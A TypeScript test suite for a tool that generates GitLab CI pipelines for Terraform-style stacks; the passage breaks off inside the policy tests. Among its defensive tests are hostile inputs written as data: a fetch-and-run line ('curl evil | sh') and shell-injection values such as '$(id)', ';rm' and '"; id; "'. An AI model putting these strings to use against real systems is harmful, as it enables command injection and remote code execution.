import { afterAll, afterEach, beforeAll, describe, expect, test } from "bun:test";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createGitlab } from "@orch/gitlab";
import { createMockGitlab } from "@orch/gitlab/mock";
import { parse } from "yaml";
import {
  type ApplyInput,
  GenerateError,
  generatePipeline,
  PLAN_RETENTION_MS,
  type PlanInput,
  SUMMARY_FILTER,
} from "./pipeline-gen";
import { POLICY_FILTER, type PolicySet } from "./policy";
import type { Stack } from "./scan";

const stack = (name: string, over: Partial<Stack> = {}): Stack => ({
  name,
  path: `stacks/${name}`,
  tool: "terraform",
  version: "1.9.8",
  tags: [],
  dependsOn: [],
  watch: [],
  applyOn: "command",
  backend: "http",
  ...over,
});

// net <- db <- app, net <- queue; tofu for queue
const STACKS = [
  stack("app", { dependsOn: ["db"] }),
  stack("db", { dependsOn: ["net"] }),
  stack("net"),
  stack("queue", { dependsOn: ["net"], tool: "tofu", version: "1.8.2" }),
];

const plan = (over: Partial<PlanInput> = {}): PlanInput => ({
  action: "plan",
  stacks: STACKS,
  select: ["app", "db", "net", "queue"],
  audience: "orch.example.com",
  apiUrl: "https://orch.example.com",
  summaryPath: "/runs/0b9e5bd2/plan-summary",
  helperImage: "registry.example.com/orch/ci-helper:1.0.0",
  ...over,
});

const apply = (over: Partial<ApplyInput> = {}): ApplyInput => ({
  action: "apply",
  stacks: STACKS,
  select: ["app", "db", "net", "queue"],
  planJobs: { app: 104, db: 103, net: 101, queue: 102 },
  ...over,
});

// biome-ignore lint/suspicious/noExplicitAny: a job read back from YAML, looked into loosely by the tests
type Job = Record<string, any>;
const jobsOf = (yaml: string): Record<string, Job> => {
  const { stages: _, ...jobs } = parse(yaml);
  return jobs;
};
const stagesOf = (yaml: string): string[] => parse(yaml).stages;
const needsOf = (job: Job): string[] => job.needs.map((n: { job: string }) => n.job);

const failure = (fn: () => unknown): GenerateError => {
  try {
    fn();
  } catch (e) {
    if (e instanceof GenerateError) return e;
    throw e;
  }
  throw new Error("it did not throw");
};

describe("a plan pipeline", () => {
  test("snapshot", () => {
    expect(generatePipeline(plan())).toMatchSnapshot();
  });

  test("one stage per wave, then the summaries", () => {
    const yaml = generatePipeline(plan());
    expect(stagesOf(yaml)).toEqual(["wave-0", "wave-1", "wave-2", "summary"]);
    const jobs = jobsOf(yaml);
    expect(Object.keys(jobs).sort()).toEqual([
      "plan:app",
      "plan:db",
      "plan:net",
      "plan:queue",
      "summary:app",
      "summary:db",
      "summary:net",
      "summary:queue",
    ]);
    expect(jobs["plan:net"]?.stage).toBe("wave-0");
    expect(jobs["plan:db"]?.stage).toBe("wave-1");
    expect(jobs["plan:queue"]?.stage).toBe("wave-1");
    expect(jobs["plan:app"]?.stage).toBe("wave-2");
    expect(jobs["summary:app"]?.stage).toBe("summary");
  });

  test("a stack needs the stacks it depends on and no one else; the first wave needs nothing", () => {
    const jobs = jobsOf(generatePipeline(plan()));
    expect(jobs["plan:net"]?.needs).toEqual([]);
    expect(needsOf(jobs["plan:db"] as Job)).toEqual(["plan:net"]);
    expect(needsOf(jobs["plan:queue"] as Job)).toEqual(["plan:net"]);
    expect(needsOf(jobs["plan:app"] as Job)).toEqual(["plan:db"]);
  });

  test("a job does not download the artifacts of the jobs it waits for; a summary downloads its plan", () => {
    const jobs = jobsOf(generatePipeline(plan()));
    expect(jobs["plan:db"]?.needs).toEqual([{ job: "plan:net", artifacts: false }]);
    expect(jobs["summary:db"]?.needs).toEqual([{ job: "plan:db", artifacts: true }]);
  });

  test("the plan is saved as an artifact in the stack's directory, and expires", () => {
    const job = jobsOf(generatePipeline(plan()))["plan:db"] as Job;
    expect(job.artifacts).toEqual({
      paths: ["stacks/db/plan.tfplan", "stacks/db/plan.json"],
      expire_in: "1 week",
      access: "developer",
    });
    // the apply flow refuses a plan older than this: it is the artifact's `expire_in`, in milliseconds
    expect(PLAN_RETENTION_MS).toBe(7 * 24 * 3600 * 1000);
    expect(job.script).toEqual([
      "cd stacks/db",
      "terraform init -input=false",
      "terraform plan -input=false -lock-timeout=5m -out=plan.tfplan",
      "terraform show -json plan.tfplan > plan.json",
    ]);
  });

  test("a stack at the root of the repository needs no cd and has bare artifact paths", () => {
    const jobs = jobsOf(
      generatePipeline(plan({ stacks: [stack("root", { path: "." })], select: ["root"] })),
    );
    expect(jobs["plan:root"]?.script[0]).toBe("terraform init -input=false");
    expect(jobs["plan:root"]?.artifacts.paths).toEqual(["plan.tfplan", "plan.json"]);
  });

  test("every stack has its own resource group, and a plan can be cancelled by a newer push", () => {
    const jobs = jobsOf(generatePipeline(plan()));
    for (const name of ["app", "db", "net", "queue"]) {
      expect(jobs[`plan:${name}`]?.resource_group).toBe(`stack-${name}`);
      expect(jobs[`plan:${name}`]?.interruptible).toBe(true);
    }
  });

  test("the tool is set up by its version: the image tag", () => {
    const jobs = jobsOf(generatePipeline(plan()));
    expect(jobs["plan:net"]?.image).toEqual({
      name: "hashicorp/terraform:1.9.8",
      entrypoint: [""],
    });
    expect(jobs["plan:queue"]?.image).toEqual({
      name: "ghcr.io/opentofu/opentofu:1.8.2",
      entrypoint: [""],
    });
    expect(jobs["plan:queue"]?.script).toContain("tofu init -input=false");
  });

  test("only the summary job holds the platform's id_token; the tool jobs hold none unless the cloud needs one", () => {
    const jobs = jobsOf(generatePipeline(plan()));
    expect(jobs["summary:db"]?.id_tokens).toEqual({ ORCH_ID_TOKEN: { aud: "orch.example.com" } });
    for (const [name, job] of Object.entries(jobs)) {
      if (name.startsWith("plan:")) expect(job.id_tokens).toBeUndefined();
    }
    const cloud = jobsOf(
      generatePipeline(
        plan({ cloudTokens: { GCP_ID_TOKEN: "https://iam.example/gcp", AWS: "sts" } }),
      ),
    );
    expect(cloud["plan:db"]?.id_tokens).toEqual({
      AWS: { aud: "sts" },
      GCP_ID_TOKEN: { aud: "https://iam.example/gcp" },
    });
    expect(cloud["summary:db"]?.id_tokens).toEqual({ ORCH_ID_TOKEN: { aud: "orch.example.com" } });
  });

  test("the summary job signs in, summarises the plan with the counts only, and posts it", () => {
    const job = jobsOf(generatePipeline(plan()))["summary:db"] as Job;
    expect(job.image).toEqual({
      name: "registry.example.com/orch/ci-helper:1.0.0",
      entrypoint: [""],
    });
    expect(job.variables).toEqual({ ORCH_API_URL: "https://orch.example.com" });
    expect(job.script).toEqual([
      'login="$(orch ci login)"',
      'eval "$login"',
      `jq -c --arg stack db '${SUMMARY_FILTER}' stacks/db/plan.json > summary.json`,
      'curl --fail --silent --show-error --request POST --header "Authorization: Bearer $ORCH_TOKEN" --header "Content-Type: application/json" --data @summary.json "$ORCH_API_URL/runs/0b9e5bd2/plan-summary"',
    ]);
  });

  test("a stack outside the selection is left out, and a dependency through it is still waited for", () => {
    // app -> db -> net, with db not selected
    const jobs = jobsOf(generatePipeline(plan({ select: ["app", "net"] })));
    expect(Object.keys(jobs).sort()).toEqual([
      "plan:app",
      "plan:net",
      "summary:app",
      "summary:net",
    ]);
    expect(needsOf(jobs["plan:app"] as Job)).toEqual(["plan:net"]);
    expect(jobs["plan:app"]?.stage).toBe("wave-1");
  });

  test("a single stack is one wave with nothing to wait for", () => {
    const yaml = generatePipeline(plan({ select: ["app"] }));
    expect(stagesOf(yaml)).toEqual(["wave-0", "summary"]);
    expect(jobsOf(yaml)["plan:app"]?.needs).toEqual([]);
  });
});

describe("an apply pipeline", () => {
  test("snapshot", () => {
    expect(generatePipeline(apply())).toMatchSnapshot();
  });

  test("applies in dependency order, from the plan saved by the plan job", () => {
    const yaml = generatePipeline(apply());
    expect(stagesOf(yaml)).toEqual(["wave-0", "wave-1", "wave-2"]);
    const jobs = jobsOf(yaml);
    expect(Object.keys(jobs).sort()).toEqual(["apply:app", "apply:db", "apply:net", "apply:queue"]);
    expect(jobs["apply:db"]?.needs).toEqual([{ job: "apply:net", artifacts: false }]);
    expect(jobs["apply:net"]?.needs).toEqual([]);
    expect(jobs["apply:db"]?.script).toEqual([
      "cd stacks/db",
      'wget -q --header "JOB-TOKEN: $CI_JOB_TOKEN" -O plan.tfplan "$CI_API_V4_URL/projects/$CI_PROJECT_ID/jobs/103/artifacts/stacks/db/plan.tfplan"',
      "terraform init -input=false",
      "terraform apply -input=false -lock-timeout=5m plan.tfplan",
    ]);
  });

  test("an apply is in the stack's resource group and is never interrupted", () => {
    const jobs = jobsOf(generatePipeline(apply()));
    for (const name of ["app", "db", "net", "queue"]) {
      expect(jobs[`apply:${name}`]?.resource_group).toBe(`stack-${name}`);
      expect(jobs[`apply:${name}`]?.interruptible).toBeUndefined();
    }
  });

  test("no job holds the platform's id_token, and the cloud's is passed on", () => {
    const jobs = jobsOf(generatePipeline(apply({ cloudTokens: { AWS_ID_TOKEN: "sts" } })));
    for (const job of Object.values(jobs)) {
      expect(job.id_tokens).toEqual({ AWS_ID_TOKEN: { aud: "sts" } });
    }
  });

  test("a stack with no saved plan is refused, whatever else was given", () => {
    const e = failure(() => generatePipeline(apply({ planJobs: { app: 1, db: 2, net: 3 } })));
    expect(e.problems).toEqual(['stack "queue" has no saved plan to apply']);
    for (const bad of [0, -1, 1.5, Number.NaN, 2 ** 60]) {
      expect(() =>
        generatePipeline(apply({ planJobs: { app: 1, db: 2, net: 3, queue: bad } })),
      ).toThrow(GenerateError);
    }
  });
});

describe("a stack with an environment gets its variables as TF_VAR_* (IAC-11)", () => {
  // the tool image must hold orch as well, so the default one is not enough
  const images = {
    terraform: "registry.example.com/platform/terraform-orch",
    tofu: "registry.example.com/platform/tofu-orch",
  };
  const stacks = [stack("db", { environment: "staging" }), stack("net")];
  const generate = (over: Partial<PlanInput> = {}) =>
    generatePipeline(plan({ stacks, select: ["db", "net"], images, ...over }));

  test("its plan job signs in as the job and runs each tool command with the variables", () => {
    const job = jobsOf(generate())["plan:db"] as Job;
    expect(job.environment).toEqual({ name: "staging", action: "access" });
    expect(job.id_tokens).toEqual({ ORCH_ID_TOKEN: { aud: "orch.example.com" } });
    expect(job.variables).toMatchObject({
      ORCH_API_URL: "https://orch.example.com",
      TF_HTTP_USERNAME: "gitlab-ci-token",
    });
    expect(job.image.name).toBe("registry.example.com/platform/terraform-orch:1.9.8");
    expect(job.script).toEqual([
      "cd stacks/db",
      'login="$(orch ci login)"',
      'eval "$login"',
      "orch run --prefix TF_VAR_ -- terraform init -input=false",
      "orch run --prefix TF_VAR_ -- terraform plan -input=false -lock-timeout=5m -out=plan.tfplan",
      "orch run --prefix TF_VAR_ -- terraform show -json plan.tfplan > plan.json",
    ]);
  });

  test("a stack with none is as it was: no sign-in, no id_token, no environment", () => {
    const job = jobsOf(generate())["plan:net"] as Job;
    expect(job.environment).toBeUndefined();
    expect(job.id_tokens).toBeUndefined();
    expect(job.variables).not.toHaveProperty("ORCH_API_URL");
    expect(job.script).toEqual([
      "cd stacks/net",
      "terraform init -input=false",
      "terraform plan -input=false -lock-timeout=5m -out=plan.tfplan",
      "terraform show -json plan.tfplan > plan.json",
    ]);
  });

  test("the cloud's id_tokens stay next to the platform's, and the other tools are wrapped the same way", () => {
    const tofu = [stack("q", { tool: "tofu", version: "1.8.2", environment: "prod" })];
    const jobs = jobsOf(
      generate({ stacks: tofu, select: ["q"], cloudTokens: { AWS_ID_TOKEN: "sts" } }),
    );
    expect(jobs["plan:q"]?.id_tokens).toEqual({
      AWS_ID_TOKEN: { aud: "sts" },
      ORCH_ID_TOKEN: { aud: "orch.example.com" },
    });
    expect(jobs["plan:q"]?.script).toContain("orch run --prefix TF_VAR_ -- tofu init -input=false");
    const tg = [stack("t", { tool: "terragrunt", version: "0.67.0", environment: "prod" })];
    const grunt = jobsOf(
      generate({
        stacks: tg,
        select: ["t"],
        images: { terragrunt: "registry.example.com/tg-orch" },
      }),
    );
    expect(grunt["plan:t"]?.script).toContain(
      "orch run --prefix TF_VAR_ -- terragrunt plan -input=false -lock-timeout=5m -out=plan.tfplan",
    );
  });

  test("nothing of a variable is in the pipeline: TF_VAR_ is only the prefix handed to orch", () => {
    const yaml = generate();
    const mentions = yaml.match(/TF_VAR_\S*/g) ?? [];
    expect(mentions).toHaveLength(3);
    expect(new Set(mentions)).toEqual(new Set(["TF_VAR_"]));
    expect(yaml).not.toMatch(/export |TF_VAR_\w+=/);
    // the job token and the id_token are references, never values
    expect(yaml).not.toMatch(/eyJ[A-Za-z0-9_-]{10,}/);
  });

  test("an apply of the same stack is unchanged: the saved plan holds the values, so nothing signs in", () => {
    const yaml = generatePipeline(apply({ stacks, select: ["db"], planJobs: { db: 7 } }));
    const job = jobsOf(yaml)["apply:db"] as Job;
    expect(job.environment).toBeUndefined();
    expect(job.id_tokens).toBeUndefined();
    expect(job.variables).not.toHaveProperty("ORCH_API_URL");
    expect(job.image.name).toBe("hashicorp/terraform:1.9.8");
    expect(job.script.join("\n")).not.toContain("orch");
    expect(yaml).not.toContain("TF_VAR_");
  });

  test("the plan is refused until the tool has an image that holds orch", () => {
    const e = failure(() => generatePipeline(plan({ stacks, select: ["db", "net"] })));
    expect(e.problems).toEqual([
      'stack "db" has an environment, so its plan job runs orch: pass images.terraform (an image with terraform and orch)',
    ]);
    // one problem, not two, where the tool has no image at all
    const tg = [stack("t", { tool: "terragrunt", version: "0.67.0", environment: "prod" })];
    expect(failure(() => generatePipeline(plan({ stacks: tg, select: ["t"] }))).problems).toEqual([
      'stack "t" uses terragrunt, which needs an image: pass images.terragrunt',
    ]);
    // an empty image is no image: it is refused, never built into ":1.9.8"
    const empty = failure(() =>
      generatePipeline(plan({ stacks, select: ["db"], images: { terraform: "" } })),
    );
    expect(empty.problems).toContain("image for terraform is not an image repository");
  });

  test("an environment that could reach a job's configuration is refused", () => {
    for (const environment of ["", "Prod", "a b", "a--b", "a;id", "x\ny", "$X", "a:b", "-a"]) {
      const s = stack("db", { environment });
      expect(
        () => generatePipeline(plan({ stacks: [s], select: ["db"], images })),
        JSON.stringify(environment),
      ).toThrow(GenerateError);
    }
  });
});

describe("the output is a pipeline GitLab accepts", () => {
  const stops: Array<() => void> = [];
  afterEach(() => {
    for (const stop of stops.splice(0)) stop();
  });

  test("lint accepts a plan pipeline and an apply pipeline, with and without cloud tokens", async () => {
    const mock = createMockGitlab();
    stops.push(() => mock.stop());
    const project = mock.addProject({ path: "acme/infra", defaultBranch: "main", files: {} });
    const gitlab = createGitlab({
      baseUrl: mock.url,
      auth: { type: "private-token", token: mock.token },
      maxRetries: 0,
    });
    for (const yaml of [
      generatePipeline(plan()),
      generatePipeline(plan({ cloudTokens: { AWS_ID_TOKEN: "sts" } })),
      generatePipeline(apply()),
      generatePipeline(apply({ select: ["net"] })),
      generatePipeline(
        plan({
          stacks: [stack("db", { environment: "staging" })],
          select: ["db"],
          images: { terraform: "registry.example.com/platform/terraform-orch" },
        }),
      ),
    ]) {
      expect(await gitlab.ci.lint(project.id, yaml)).toMatchObject({ valid: true, errors: [] });
    }
  });

  test("the lint would reject a pipeline whose jobs have no script (it is checking something)", async () => {
    const mock = createMockGitlab();
    stops.push(() => mock.stop());
    const project = mock.addProject({ path: "acme/infra", defaultBranch: "main", files: {} });
    const gitlab = createGitlab({
      baseUrl: mock.url,
      auth: { type: "private-token", token: mock.token },
      maxRetries: 0,
    });
    const broken = generatePipeline(plan()).replaceAll("script:", "scrip:");
    expect((await gitlab.ci.lint(project.id, broken)).valid).toBe(false);
  });
});

describe("generation fails loudly", () => {
  test("on a cycle, naming the stacks in it", () => {
    const e = failure(() =>
      generatePipeline(
        plan({
          stacks: [stack("a", { dependsOn: ["b"] }), stack("b", { dependsOn: ["a"] })],
          select: ["a"],
        }),
      ),
    );
    expect(e.problems).toHaveLength(1);
    expect(e.message).toContain("a -> b -> a");
  });

  test("on a cycle among stacks that are not selected", () => {
    expect(() =>
      generatePipeline(
        plan({
          stacks: [stack("ok"), stack("a", { dependsOn: ["b"] }), stack("b", { dependsOn: ["a"] })],
          select: ["ok"],
        }),
      ),
    ).toThrow(/cycle/);
  });

  test("on a dependency that is not a stack (one that failed to scan)", () => {
    const e = failure(() =>
      generatePipeline(plan({ stacks: [stack("a", { dependsOn: ["gone"] })], select: ["a"] })),
    );
    expect(e.message).toContain("gone");
  });

  test("on a missing tool version, for every stack that has none", () => {
    const e = failure(() =>
      generatePipeline(
        plan({
          stacks: [stack("a", { version: null }), stack("b", { version: null }), stack("c")],
          select: ["c", "b", "a"],
        }),
      ),
    );
    expect(e.problems).toEqual([
      'stack "a" has no version: set version in its stack.yml',
      'stack "b" has no version: set version in its stack.yml',
    ]);
  });

  test("on terragrunt, which has no default image, until one is given", () => {
    const stacks = [stack("a", { tool: "terragrunt", version: "0.67.0" })];
    const e = failure(() => generatePipeline(plan({ stacks, select: ["a"] })));
    expect(e.problems).toEqual([
      'stack "a" uses terragrunt, which needs an image: pass images.terragrunt',
    ]);
    const jobs = jobsOf(
      generatePipeline(
        plan({ stacks, select: ["a"], images: { terragrunt: "registry.example.com/tg" } }),
      ),
    );
    expect(jobs["plan:a"]?.image.name).toBe("registry.example.com/tg:0.67.0");
    expect(jobs["plan:a"]?.script).toContain("terragrunt init -input=false");
  });

  test("on a stack that is not there, an empty selection and a selection of nothing but repeats", () => {
    expect(failure(() => generatePipeline(plan({ select: ["nope"] }))).problems).toEqual([
      'unknown stack "nope"',
    ]);
    expect(failure(() => generatePipeline(plan({ select: [] }))).problems).toEqual([
      "no stack was selected",
    ]);
    // a repeated name is one job, not two
    const once = generatePipeline(plan({ select: ["net", "net"] }));
    expect(Object.keys(jobsOf(once)).sort()).toEqual(["plan:net", "summary:net"]);
    expect(once).toStartWith("# Generated by orch: a child pipeline for plan of 1 stack. ");
  });

  test("an unknown name is shown quoted and cut short, as it may be what a user typed", () => {
    const [problem] = failure(() =>
      generatePipeline(plan({ select: [`x\n- run: curl evil | sh ${"y".repeat(500)}`] })),
    ).problems;
    expect(problem).toStartWith('unknown stack "x\\n- run');
    expect(problem?.length).toBeLessThan(120);
  });

  test("on a stack that would wait for more jobs than GitLab allows, looking through stacks that are not selected", () => {
    // `top` depends on `mids` stacks that are not selected, each on a selected one
    const fixture = (mids: number) => {
      const leaves = Array.from({ length: mids }, (_, i) => stack(`leaf${i}`));
      const middle = Array.from({ length: mids }, (_, i) =>
        stack(`mid${i}`, { dependsOn: [`leaf${i}`] }),
      );
      const top = stack("top", { dependsOn: middle.map((m) => m.name) });
      return plan({
        stacks: [...leaves, ...middle, top],
        select: [...leaves.map((l) => l.name), "top"],
      });
    };
    expect(needsOf(jobsOf(generatePipeline(fixture(50)))["plan:top"] as Job)).toHaveLength(50);
    const e = failure(() => generatePipeline(fixture(51)));
    expect(e.problems).toEqual([
      'stack "top" would wait for 51 stacks; GitLab allows 50 needs per job',
    ]);
  });

  test("on a name, path or version that could reach a shell or break a job name", () => {
    const hostile = [
      stack("a b"),
      stack("a$(id)"),
      stack("A"),
      stack("ok", { path: "stacks/a b" }),
      stack("ok", { path: "stacks/$(id)" }),
      stack("ok", { path: "../up" }),
      stack("ok", { path: "stacks/a;rm" }),
      stack("ok", { path: "-rf" }),
      stack("ok", { path: "stacks/\nx" }),
      stack("ok", { version: "1.9.8; id" }),
      stack("ok", { version: "latest" }),
      stack("ok", { version: "1.9.8\n" }),
    ];
    for (const s of hostile) {
      expect(() => generatePipeline(plan({ stacks: [s], select: [s.name] }))).toThrow(
        GenerateError,
      );
    }
  });

  test("on options that could reach a shell or a job's configuration", () => {
    const bad: Array<Partial<PlanInput>> = [
      { audience: "" },
      { audience: "has space" },
      { audience: "a\nb" },
      { audience: "x".repeat(300) },
      { apiUrl: "ftp://orch.example.com" },
      { apiUrl: "https://orch.example.com/" },
      { apiUrl: 'https://orch.example.com"; id; "' },
      { apiUrl: "https://orch.example.com/$(id)" },
      { apiUrl: "https://user:pw@orch.example.com" },
      { summaryPath: "runs/1/plan-summary" },
      { summaryPath: '/runs/1"; id; "' },
      { summaryPath: "/runs/$HOME" },
      { summaryPath: "/runs/ 1" },
      { summaryPath: "/runs/../x" },
      { helperImage: "" },
      { helperImage: "img; id" },
      { helperImage: "Img:1" },
      { helperImage: "img:1\nx" },
      { cloudTokens: { "bad name": "a" } },
      { cloudTokens: { ORCH_ID_TOKEN: "a" } },
      { cloudTokens: { ORCH_X: "a" } },
      { cloudTokens: { OK: "has space" } },
      { cloudTokens: { OK: "" } },
      { images: { terraform: "img; id" } },
      { images: { terraform: "img:1.0" } },
      { images: { terraform: "Img" } },
    ];
    for (const over of bad) {
      expect(() => generatePipeline(plan(over)), JSON.stringify(over)).toThrow(GenerateError);
    }
    // the same options are fine in their normal form
    expect(() =>
      generatePipeline(
        plan({
          apiUrl: "http://localhost:3000",
          helperImage: "registry.example.com:5000/orch/helper:1.0.0",
        }),
      ),
    ).not.toThrow();
    const overridden = generatePipeline(
      plan({ images: { terraform: "localhost:5000/hashi/terraform" } }),
    );
    expect(jobsOf(overridden)["plan:net"]?.image.name).toBe("localhost:5000/hashi/terraform:1.9.8");
    expect(() => generatePipeline(apply({ cloudTokens: { "bad name": "a" } }))).toThrow(
      GenerateError,
    );
  });

  test("with every problem found at once, not the first", () => {
    const e = failure(() =>
      generatePipeline(
        plan({
          stacks: [stack("a", { version: null }), stack("b", { path: "a b" })],
          select: ["a", "b", "c"],
          audience: "",
        }),
      ),
    );
    expect(e.problems).toHaveLength(4);
    expect(e.message).toStartWith("cannot generate the pipeline: ");
  });
});

test("the pipeline is the same whatever order the stacks and the selection come in", () => {
  const a = generatePipeline(plan());
  const b = generatePipeline(
    plan({ stacks: [...STACKS].reverse(), select: ["queue", "net", "db", "app"] }),
  );
  expect(b).toBe(a);
});

test("the only variables a job reads are the ones GitLab and the platform set, and no secret is written in it", () => {
  const allowed = new Set([
    "CI_JOB_TOKEN",
    "CI_API_V4_URL",
    "CI_PROJECT_ID",
    "ORCH_TOKEN",
    "ORCH_API_URL",
    "login",
    "orch",
    "stack",
    "c",
  ]);
  for (const yaml of [
    generatePipeline(plan({ cloudTokens: { AWS_ID_TOKEN: "sts" } })),
    generatePipeline(apply({ cloudTokens: { AWS_ID_TOKEN: "sts" } })),
  ]) {
    const used = new Set(
      Array.from(yaml.matchAll(/\$\(?\{?([A-Za-z_][A-Za-z0-9_]*)/g), (m) => m[1]),
    );
    for (const name of used) expect(allowed.has(name ?? ""), name).toBe(true);
    expect(yaml).not.toMatch(/eyJ[A-Za-z0-9_-]{10,}/); // no JWT
    expect(yaml).not.toMatch(/Bearer [^$]/);
  }
});

describe("many graphs", () => {
  // a small seeded generator, so a failure is the same failure next time
  const rng = (seed: number) => () => {
    seed = (seed * 1664525 + 1013904223) % 2 ** 32;
    return seed / 2 ** 32;
  };

  test("a job waits for everything it depends on that is selected, and only for earlier stages", () => {
    for (let seed = 1; seed <= 150; seed++) {
      const r = rng(seed);
      const n = 1 + Math.floor(r() * 9);
      const names = Array.from({ length: n }, (_, i) => `s${i}`);
      // an edge only goes to a lower number, so the graph has no cycle
      const stacks = names.map((name, i) =>
        stack(name, { dependsOn: names.slice(0, i).filter(() => r() < 0.35) }),
      );
      const select = names.filter(() => r() < 0.6);
      if (select.length === 0) select.push("s0");
      const kind = r() < 0.5 ? "plan" : "apply";
      const yaml = generatePipeline(
        kind === "plan"
          ? plan({ stacks, select })
          : apply({
              stacks,
              select,
              planJobs: Object.fromEntries(names.map((x, i) => [x, i + 1])),
            }),
      );
      const jobs = jobsOf(yaml);
      const stages = stagesOf(yaml);
      const jobOf = (name: string) => jobs[`${kind}:${name}`] as Job;

      // the oracle: what each stack depends on, through any stacks, among the selected
      const direct = new Map(stacks.map((s) => [s.name, s.dependsOn]));
      const ancestors = (name: string, seen = new Set<string>()): Set<string> => {
        for (const d of direct.get(name) ?? []) {
          if (!seen.has(d)) {
            seen.add(d);
            ancestors(d, seen);
          }
        }
        return seen;
      };
      // what a job waits for through its `needs`, to any depth
      const waitsFor = (name: string, seen = new Set<string>()): Set<string> => {
        for (const need of needsOf(jobOf(name))) {
          const dep = need.slice(kind.length + 1);
          if (!seen.has(dep)) {
            seen.add(dep);
            waitsFor(dep, seen);
          }
        }
        return seen;
      };
      for (const name of select) {
        const want = [...ancestors(name)].filter((a) => select.includes(a)).sort();
        expect([...waitsFor(name)].sort(), `seed ${seed} ${name}`).toEqual(want);
        for (const need of needsOf(jobOf(name))) {
          expect(select).toContain(need.slice(kind.length + 1));
          const earlier = stages.indexOf(jobs[need]?.stage) < stages.indexOf(jobOf(name).stage);
          expect(earlier, `seed ${seed} ${name} needs ${need}`).toBe(true);
        }
      }
      expect(Object.keys(jobs).filter((j) => j.startsWith(`${kind}:`))).toHaveLength(select.length);
    }
  });
});

describe("the plan summary filter", () => {
  const jq = Bun.which("jq");
  const run = async (input: unknown) => {
    const proc = Bun.spawn([jq as string, "-c", "--arg", "stack", "db", SUMMARY_FILTER], {
      stdin: new TextEncoder().encode(JSON.stringify(input)),
      stdout: "pipe",
      stderr: "pipe",
    });
    const [out, err] = await Promise.all([
      new Response(proc.stdout).text(),
      new Response(proc.stderr).text(),
    ]);
    expect(await proc.exited, err).toBe(0);
    return JSON.parse(out);
  };
  const change = (address: string, actions: string[]) => ({
    address,
    type: "x",
    change: {
      actions,
      before: { password: "hunter2-before" },
      after: { password: "hunter2-after" },
      after_sensitive: { password: true },
    },
  });

  // jq is a dev tool, not a dependency: without it the filter is checked by the pipeline's own run
  test.skipIf(!jq)(
    "counts what terraform counts, lists addresses and actions, and leaves values out",
    async () => {
      const summary = await run({
        format_version: "1.2",
        resource_changes: [
          change("aws_a.one", ["create"]),
          change("aws_a.two", ["create"]),
          change("aws_b.one", ["update"]),
          change("aws_c.one", ["delete"]),
          change("aws_d.one", ["delete", "create"]),
          change("aws_e.one", ["create", "delete"]),
          change("aws_f.one", ["no-op"]),
          change("data.aws_g.one", ["read"]),
        ],
        planned_values: { root_module: { resources: [{ values: { password: "hunter2" } }] } },
      });
      expect(summary).toEqual({
        stack: "db",
        add: 4,
        change: 1,
        destroy: 3,
        resources: [
          { address: "aws_a.one", actions: ["create"] },
          { address: "aws_a.two", actions: ["create"] },
          { address: "aws_b.one", actions: ["update"] },
          { address: "aws_c.one", actions: ["delete"] },
          { address: "aws_d.one", actions: ["delete", "create"] },
          { address: "aws_e.one", actions: ["create", "delete"] },
        ],
      });
      expect(JSON.stringify(summary)).not.toContain("hunter2");
    },
  );

  test.skipIf(!jq)(
    "a plan with no changes has no resource_changes at all, and that is zero",
    async () => {
      expect(await run({ format_version: "1.2" })).toEqual({
        stack: "db",
        add: 0,
        change: 0,
        destroy: 0,
        resources: [],
      });
    },
  );

  describe("as the job runs it", () => {
    let dir: string;
    beforeAll(async () => {
      dir = await mkdtemp(join(tmpdir(), "orch-summary-"));
    });
    afterAll(async () => {
      await rm(dir, { recursive: true, force: true });
    });

    // the generated line goes through a real shell, so its quoting is what is tested
    test.skipIf(!jq)(
      "the generated jq line, run by sh, writes the summary of the stack's plan",
      async () => {
        const line = (jobsOf(generatePipeline(plan()))["summary:db"] as Job).script[2] as string;
        await mkdir(join(dir, "stacks/db"), { recursive: true });
        await writeFile(
          join(dir, "stacks/db/plan.json"),
          JSON.stringify({
            resource_changes: [change("aws_a.one", ["create"]), change("aws_b.one", ["delete"])],
          }),
        );
        const proc = Bun.spawn(["sh", "-c", line], { cwd: dir, stderr: "pipe" });
        expect(await proc.exited, await new Response(proc.stderr).text()).toBe(0);
        expect(JSON.parse(await readFile(join(dir, "summary.json"), "utf8"))).toEqual({
          stack: "db",
          add: 1,
          change: 0,
          destroy: 1,
          resources: [
            { address: "aws_a.one", actions: ["create"] },
            { address: "aws_b.one", actions: ["delete"] },
          ],
        });
      },
    );
  });

  test.skipIf(!jq)("the list is cut at 500 resources while the counts stay whole", async () => {
    const many = Array.from({ length: 700 }, (_, i) => change(`aws_a.n${i}`, ["create"]));
    const summary = await run({ resource_changes: many });
    expect(summary.add).toBe(700);
    expect(summary.resources).toHaveLength(500);
  });
});

describe("policy in a plan pipeline", () => {
  const SET: PolicySet = {
    name: "prod-rules",
    source: "platform/policies",
    ref: "v1.2.0",
    path: "terraform",
    tag: "prod",
  };
  const OTHER: PolicySet = {
    ...SET,
    name: "pci",
    source: "platform/pci",
    ref: "main",
    path: ".",
    tag: "pci",
  };
  const IMAGE = "registry.example.com/orch/ci-policy:1.0.0";
  const POLICY_PATH = "/runs/0b9e5bd2/policy-verdict";
  const stacks = [
    stack("net"),
    stack("db", { dependsOn: ["net"], tags: ["prod", "pci"] }),
    stack("app", { dependsOn: ["db"], tags: ["prod"] }),
  ];
  const withPolicy = (over: Partial<NonNullable<PlanInput["policy"]>> = {}) =>
    plan({
      stacks,
      select: ["app", "db", "net"],
      policy: { sets: [SET, OTHER], image: IMAGE, path: POLICY_PATH, ...over },
    });

  test("snapshot", () => {
    expect(generatePipeline(withPolicy())).toMatchSnapshot();
  });

  test("a stack that carries a set's tag is judged in its summary job, with the policy image", () => {
    const jobs = jobsOf(generatePipeline(withPolicy()));
    const db = jobs["summary:db"] as Job;
    expect(db.image.name).toBe(IMAGE);
    const text = db.script.join("\n");
    // both sets, fetched with the job's own token
    expect(text).toContain("platform%2Fpolicies/repository/archive.tar.gz?sha=v1.2.0");
    expect(text).toContain("platform%2Fpci/repository/archive.tar.gz?sha=main");
    expect(text).toContain('--header "JOB-TOKEN: $CI_JOB_TOKEN"');
    expect(text).toContain("--policy policy/0/terraform --policy policy/1 stacks/db/plan.json");
    expect(text).toContain(`"$ORCH_API_URL${POLICY_PATH}"`);
    // a stack with only one of the tags is judged by that set alone
    expect((jobs["summary:app"] as Job).script.join("\n")).toContain(
      "--policy policy/0/terraform stacks/app/plan.json",
    );
    expect((jobs["summary:app"] as Job).script.join("\n")).not.toContain("platform%2Fpci");
  });
